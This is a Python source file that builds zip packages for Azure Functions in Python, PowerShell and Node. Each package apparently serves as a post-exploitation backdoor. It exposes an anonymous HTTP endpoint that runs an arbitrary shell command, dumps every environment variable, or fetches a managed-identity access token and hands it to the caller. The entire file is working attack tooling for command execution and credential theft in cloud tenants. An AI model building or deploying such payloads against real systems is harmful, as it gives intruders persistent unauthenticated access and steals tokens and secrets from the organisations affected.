import io
import json
import zipfile


class FunctionPayload:
    
    SUPPORTED_RUNTIMES = ("python", "powershell", "node")
    
    def __init__(self, runtime: str, command: str = None, identity_url: str = None, envdump: bool = False):
        runtime = runtime.lower()
        if runtime not in self.SUPPORTED_RUNTIMES:
            raise ValueError(f"Unsupported runtime '{runtime}', supported: {', '.join(self.SUPPORTED_RUNTIMES)}")
        
        self.runtime = runtime
        self.command = command
        self.identity_url = identity_url
        self.envdump = envdump

    def build(self) -> bytes:
        builder = {
            "python":     self._python,
            "powershell": self._powershell,
            "node":       self._node,
        }[self.runtime]
        return builder()

    def _make_zip(self, files: dict) -> bytes:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            for path, content in files.items():
                # Set Unix permissions 644 on all files
                info = zipfile.ZipInfo(path)
                info.external_attr = 0o644 << 16  # rw-r--r--
                if isinstance(content, str):
                    content = content.encode("utf-8")
                zf.writestr(info, content)
        buf.seek(0)
        return buf.read()

    def _binding(self) -> dict:
        name = "Request" if self.runtime == "powershell" else "req"
        out  = "Response" if self.runtime == "powershell" else "$return" if self.runtime == "python" else "res"
        return {
            "bindings": [
                {"authLevel": "anonymous", "type": "httpTrigger",
                 "direction": "in", "name": name, "methods": ["get", "post"]},
                {"type": "http", "direction": "out", "name": out}
            ]
        }

   

    def _python_code(self) -> str:
        if self.identity_url:
            return f"""import azure.functions as func
import os, urllib.request, json

def main(req: func.HttpRequest) -> func.HttpResponse:
    endpoint = os.environ.get("IDENTITY_ENDPOINT")
    header   = os.environ.get("IDENTITY_HEADER")
    if not endpoint or not header:
        return func.HttpResponse("No managed identity", status_code=500)
    url = f"{{endpoint}}?api-version=2019-08-01&resource={self.identity_url}"
    r   = urllib.request.Request(url, headers={{"X-Identity-Header": header}})
    data = json.loads(urllib.request.urlopen(r).read())
    return func.HttpResponse(json.dumps(data), mimetype="application/json")
"""
        if self.envdump:
            return """import azure.functions as func
import os, json

def main(req: func.HttpRequest) -> func.HttpResponse:
    return func.HttpResponse(json.dumps(dict(os.environ), indent=2), mimetype="application/json")
"""
        return f"""import azure.functions as func
import subprocess

def main(req: func.HttpRequest) -> func.HttpResponse:
    result = subprocess.run({repr(self.command)}, shell=True, capture_output=True, text=True)
    return func.HttpResponse(result.stdout or result.stderr or "no output", mimetype="text/plain")
"""

    def _python(self) -> bytes:
        return self._make_zip({
            "host.json":                '{"version": "2.0"}',
            "requirements.txt":         "azure-functions\n",
            "HttpTrigger/function.json": json.dumps(self._binding(), indent=2),
            "HttpTrigger/__init__.py":   self._python_code(),
        })

    def _powershell_code(self) -> str:
        if self.identity_url:
            return f"""using namespace System.Net
param($Request, $TriggerMetadata)
Connect-AzAccount -Identity | Out-Null
$token = (Get-AzAccessToken -ResourceUrl "{self.identity_url}").Token
Push-OutputBinding -Name Response -Value ([HttpResponseContext]@{{
    StatusCode = [HttpStatusCode]::OK
    Body = $token
}})
"""
        if self.envdump:
            return """using namespace System.Net
param($Request, $TriggerMetadata)
$env = Get-ChildItem Env: | ConvertTo-Json
Push-OutputBinding -Name Response -Value ([HttpResponseContext]@{
    StatusCode = [HttpStatusCode]::OK
    Body = $env
})
"""
        return f"""using namespace System.Net
param($Request, $TriggerMetadata)
$output = {self.command} | Out-String
Push-OutputBinding -Name Response -Value ([HttpResponseContext]@{{
    StatusCode = [HttpStatusCode]::OK
    Body = $output
}})
"""

    def _powershell(self) -> bytes:
        return self._make_zip({
            "host.json":                '{"version": "2.0"}',
            "HttpTrigger/run.ps1":       self._powershell_code(),
            "HttpTrigger/function.json": json.dumps(self._binding(), indent=2),
        })


    def _node_code(self) -> str:
        if self.identity_url:
            return f"""module.exports = async function(context, req) {{
    const endpoint = process.env.IDENTITY_ENDPOINT;
    const header   = process.env.IDENTITY_HEADER;
    const url = `${{endpoint}}?api-version=2019-08-01&resource={self.identity_url}`;
    const data = await fetch(url, {{ headers: {{ "X-Identity-Header": header }} }}).then(r => r.json());
    context.res = {{ body: data }};
}};
"""
        if self.envdump:
            return """module.exports = async function(context, req) {
    context.res = { body: process.env };
};
"""
        return f"""const {{ execSync }} = require('child_process');
module.exports = async function(context, req) {{
    const output = execSync({repr(self.command)}).toString();
    context.res = {{ body: output }};
}};
"""

    def _node(self) -> bytes:
        return self._make_zip({
            "host.json":                '{"version": "2.0"}',
            "HttpTrigger/index.js":      self._node_code(),
            "HttpTrigger/function.json": json.dumps(self._binding(), indent=2),
        })